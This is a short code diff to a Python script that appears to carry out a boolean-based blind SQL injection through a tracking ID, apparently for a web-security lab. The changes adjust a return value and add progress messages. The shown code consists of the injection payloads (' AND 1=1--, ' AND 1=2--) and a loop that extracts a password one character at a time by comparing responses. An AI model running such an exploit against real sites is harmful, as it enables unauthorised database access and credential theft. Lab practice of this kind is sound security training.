@@ -12,9 +12,9 @@ def test_vuln(url, session, tracking_id):
   true_response = send_request(url, session, tracking_id, urllib.parse.quote("' AND 1=1--"))
   false_response = send_request(url, session, tracking_id, urllib.parse.quote("' AND 1=2--"))
   if true_response == false_response:
-    return False
+    print("site is not vulnerable")
+    return [False, None, None]
   
-  print("site is not vulnerable")
   return [True, true_response, false_response]
 
 
@@ -37,6 +37,7 @@ def get_password(url, session, tracking_id, password_length, characters, true_re
       response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
       if response == true_response:
         password += character
+        print(f"{position}/{password_length} characters...")
         continue
       if len(password) == password_length:
         return [True, password]
